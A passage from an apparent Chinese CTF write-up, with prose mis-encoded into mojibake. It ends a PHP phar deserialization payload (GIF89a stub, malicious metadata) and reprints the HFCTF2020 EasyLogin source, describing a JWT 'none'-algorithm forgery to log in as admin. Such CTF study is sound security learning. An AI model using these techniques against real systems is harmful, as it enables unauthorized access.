</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ËÆæÁΩÆstub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Â∞ÜËá™ÂÆö‰πâÁöÑmeta-dataÂ≠òÂÖ•manifestÔºåËøô‰∏™ÊòØÂà©Áî®ÁöÑÈáçÁÇπ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂ÔºåËøô‰∏™Êñá‰ª∂ÂèØ‰ª•‰∏çÂ≠òÂú®Ôºå‰ΩÜËøôÂè•ËØ≠Âè•‰∏çËÉΩÂ∞ë
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Á≠æÂêçËá™Âä®ËÆ°ÁÆó
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁîüÊàêpharÂêéÔºåÊâæËß¶ÂèëÂèçÂ∫èÂàóÂåñÂà©Áî®ÁÇπ</p>
<p>downloadÂíådeleteÈáåÈù¢Áî±‰∫édownloadËøáÊª§flag</p>
<p>Êàë‰ª¨Âú®delete.phpÈáåÈù¢ÊâæÂà∞deleteÂáΩÊï∞ÔºåÂõûÂà∞class.phpÂèëÁé∞Ë∞ÉÁî®unlinkÂáΩÊï∞ÂàöÂ•ΩÂèØ‰ª•Ëß¶ÂèëÂèçÂ∫èÂàóÂåñ</p>
<h2 id="hfctf2020easylogin">[HFCTF2020]EasyLogin
</h2><p>‰∏äÊù•Êü•ÁúãÊ∫êÁ†Å</p>
<p>app.js</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * ¬†ÊàñËÆ∏ËØ•Áî® koa-static Êù•Â§ÑÁêÜÈùôÊÄÅÊñá‰ª∂
</span></span></span><span class="line"><span class="cl"><span class="cm"> *  Ë∑ØÂæÑËØ•ÊÄé‰πàÈÖçÁΩÆÔºü‰∏çÁÆ°‰∫ÜÂÖàÂ°´‰∏™Ê†πÁõÆÂΩïXD
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">login</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#username&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#password&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">&#34;token&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/api/login&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">,</span> <span class="nx">authorization</span><span class="o">:</span><span class="nx">token</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="p">{</span><span class="nx">status</span><span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;/home&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">xhr</span><span class="p">,</span> <span class="nx">textStatus</span><span class="p">,</span> <span class="nx">errorThrown</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseJSON</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">register</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#username&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#password&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/api/register&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="p">{</span> <span class="nx">token</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;/login&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">xhr</span><span class="p">,</span> <span class="nx">textStatus</span><span class="p">,</span> <span class="nx">errorThrown</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseJSON</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">logout</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/api/logout&#39;</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">status</span><span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;/login&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getflag</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/api/flag&#39;</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">flag</span><span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#username&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}).</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">xhr</span><span class="p">,</span> <span class="nx">textStatus</span><span class="p">,</span> <span class="nx">errorThrown</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseJSON</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏äÈù¢ËØ¥Áî®koaÊ°ÜÊû∂ÂÜôÁöÑ</p>
<h3 id="koaÊ°ÜÊû∂Âü∫Êú¨ÁõÆÂΩï">koaÊ°ÜÊû∂Âü∫Êú¨ÁõÆÂΩï
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">koaÊ°ÜÊû∂Â∏∏Áî®ÁõÆÂΩïÔºåÊñá‰ª∂
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app/controllers È°πÁõÆÊéßÂà∂Âô®Â≠òÊîæÁõÆÂΩïÔºöÊé•Êî∂ËØ∑Ê±ÇÔºåÂ§ÑÁêÜÈÄªËæë
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app/dbhelper Êï∞ÊçÆÂ∫ìCRUDÊìç‰ΩúÁöÑÂ∞ÅË£Ö
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app/models ÂØπÂ∫îÊï∞ÊçÆÂ∫ìË°®Ë°®ÁªìÊûÑ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">config/router.js È°πÁõÆË∑ØÁî±
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">node_modules app.js È°πÁõÆÂÖ•Âè£
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËÆøÈóÆcontrollers‰∏ãÁöÑapi.jsÂæóÂà∞Ê∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;jsonwebtoken&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">APIError</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../rest&#39;</span><span class="p">).</span><span class="nx">APIError</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;POST /api/register&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">}</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="nx">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;register error&#39;</span><span class="p">,</span> <span class="s1">&#39;wrong username&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">100000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">18</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">secretid</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span><span class="nx">secretid</span><span class="p">,</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">},</span> <span class="nx">secret</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span> <span class="s1">&#39;HS256&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">token</span><span class="o">:</span> <span class="nx">token</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;POST /api/login&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">}</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;login error&#39;</span><span class="p">,</span> <span class="s1">&#39;username or password is necessary&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">authorization</span> <span class="o">||</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">authorization</span> <span class="o">||</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">authorization</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">sid</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;base64&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()).</span><span class="nx">secretid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">sid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">sid</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">sid</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">sid</span> <span class="o">&lt;</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">sid</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;login error&#39;</span><span class="p">,</span> <span class="s1">&#39;no such secret id&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">[</span><span class="nx">sid</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">secret</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span> <span class="s1">&#39;HS256&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">status</span> <span class="o">=</span> <span class="nx">username</span> <span class="o">===</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="nx">user</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ctx</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">status</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;GET /api/flag&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">&#39;permission error&#39;</span><span class="p">,</span> <span class="s1">&#39;permission denied&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">flag</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;GET /api/logout&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">status</span><span class="o">:</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>jwtÊó†Á≠æÂêç</p>
<p>‰∏ç‰ªÖÁ≠æÂêçË¶ÅÊîπ‰∏∫noneÔºåsecretidË¶ÅÊîπ‰∏∫[]ÔºåÁÑ∂ÂêéÊääusernameÊîπ‰∏∫admin</p>
<p>ËøôÈáåËΩΩÁöÑÊòØPyJWTÂåÖÔºåÁî®pythonÊù•‰º™ÈÄ†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
